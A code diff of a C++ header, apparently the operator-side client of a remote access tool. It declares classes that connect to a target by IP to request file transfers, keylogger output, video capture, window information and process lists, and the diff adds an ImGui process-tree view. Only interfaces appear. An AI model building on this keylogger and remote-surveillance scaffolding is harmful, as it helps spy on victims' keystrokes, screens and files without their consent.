@@ -1,7 +1,12 @@
 #pragma once
 #include <atomic>
 #include <cstdint>
+#include <string>
+#include <unordered_map>
+#include <vector>
 #include <winsock2.h>
+
+#include "imgui.h"
 
 struct PacketHeader {
     uint32_t packet_size;
@@ -17,103 +22,101 @@ struct ResponseHeader {
 };
 
 class Feature {
-    struct RequestParam;
 protected:
-    SOCKET &sock;
+    char* m_IP = nullptr;
     const int requestKey;
-    void sendRequest(int type, int size, char *data);
-    int receiveResponse(int &size, char **data);
-    std::atomic_int returnValue = false;
+    int sendRequest(SOCKET sock,int type, int size, char *data);
+    int receiveResponse(SOCKET sock,int &size, char **data);
+    SOCKET init();
+    std::atomic_int returnValue = 0;
 public:
-    Feature(SOCKET &socket, int key) : sock(socket), requestKey(key){}
-    virtual ~Feature() = default;
-    virtual DWORD requestingFeature(LPVOID lpParam) = 0;
-    int getReturnedValue() const {
-        return returnValue.load();
-    }
-    void forwardingFeature(RequestParam param);
-};
-
-class FileFeature: public Feature {
-    struct RequestParam {
-        int type;
-        int size;
-        char *path;
-        int saveFileSize = 0;
-        char *saveFilePath = nullptr;
-    };
-public:
-    FileFeature(SOCKET &socket)
-        : Feature(socket, 0x03) {
-    }
-    DWORD requestingFeature(LPVOID lpParam) override;
-};
-
-class KeyloggerFeature: public Feature {
-    struct RequestParam {
-        int type;
-    };
-    int size = -1;
-    char *data;
-public:
-    KeyloggerFeature(SOCKET &socket)
-        : Feature(socket, 0x01) {
-    }
-    int getSize() const {
-        return size;
-    }
-    char *getData() const {
-        if (returnValue != 0) {
-            return nullptr;
-        }
-        return data;
-    }
-
-    DWORD requestingFeature(LPVOID lpParam) override;
-};
-
-class VideoFeature: public Feature {
-    struct RequestParam {
-        int type;
-    };
-    int size = -1;
-    char *data;
-public:
-    VideoFeature(SOCKET &socket)
-        : Feature(socket, 0x02) {
-    }
-    int getSize() const {
-        return size;
-    }
-    char *getData() const {
-        if (returnValue != 0) {
-            return nullptr;
-        }
-        return data;
-    }
-    DWORD requestingFeature(LPVOID lpParam) override;
-};
-
-class WindowFeature: public Feature {
-    struct RequestParam {
-        int type;
-    };
-public:
-    WindowFeature(SOCKET &socket)
-        : Feature(socket, 0x04) {
-    }
-    DWORD requestingFeature(LPVOID lpParam) override;
-};
-
-class ProcessFeature: public Feature {
     struct RequestParam {
         int type;
         int size;
         char *data;
+        int saveFileSize = 0;
+        char *saveFilePath = nullptr;
     };
-public:
-    ProcessFeature(SOCKET &socket)
-        : Feature(socket, 0x00) {
+    Feature(char* IP, int key) : requestKey(key) {
+        m_IP = strdup(IP);
     }
-    DWORD requestingFeature(LPVOID lpParam) override;
+    virtual ~Feature() = default;
+    virtual int requestingFeature(RequestParam rParam) = 0;
+    int getReturnedValue() const {
+        return returnValue.load();
+    }
+};
+
+class FileFeature: public Feature {
+public:
+    FileFeature(char* IP)
+        : Feature(IP, 0x03) {
+    }
+
+    int requestingFeature(RequestParam rParam) override;
+};
+
+class KeyloggerFeature: public Feature {
+    std::atomic_bool isKeyloggerRunning = false;
+    std::mutex m_mutex;
+    std::string keyloggingValue;
+public:
+    KeyloggerFeature(char* IP)
+        : Feature(IP, 0x01) {
+    }
+    int requestingFeature(RequestParam rParam) override;
+    bool isRunning() const;
+
+    std::string getLogging();
+};
+
+class VideoFeature: public Feature {
+public:
+    VideoFeature(char* IP)
+        : Feature(IP, 0x02) {
+    }
+    int requestingFeature(RequestParam rParam) override;
+};
+
+class WindowFeature: public Feature {
+public:
+    WindowFeature(char* IP)
+        : Feature(IP, 0x04) {
+    }
+
+    int requestingFeature(RequestParam rParam) override;
+};
+
+class ProcessFeature: public Feature {
+    static std::unordered_map<DWORD, bool> m_selectedProcesses;
+public:
+    struct ProcessInfoNode {
+        DWORD PID;
+        char *Name;
+        DWORD ParentPID;
+        SIZE_T MemoryUsage;
+        ULONGLONG CPUTimeUser;
+        int childCount = 0;
+        ProcessInfoNode **children = nullptr;
+        static void DisplayNode(const ProcessInfoNode *node);
+
+        ProcessInfoNode(DWORD pid, const char *name, DWORD parentPID, SIZE_T memoryUsage, ULONGLONG cpuTimeUser);
+
+        ~ProcessInfoNode();
+
+        void addChild(ProcessInfoNode *child);
+    };
+private:
+    std::mutex m_mutex;
+    std::unordered_map<DWORD, ProcessInfoNode*> m_allNodes;
+public:
+    ProcessFeature(char* IP): Feature(IP, 0x00) {};
+
+    int requestingFeature(RequestParam rParam) override;
+
+    std::unordered_map<DWORD, ProcessInfoNode*> getProcessList();
+
+    static std::vector<DWORD> getSelectedProcesses();
+
+    static bool isAnyProcessSelected();
 };
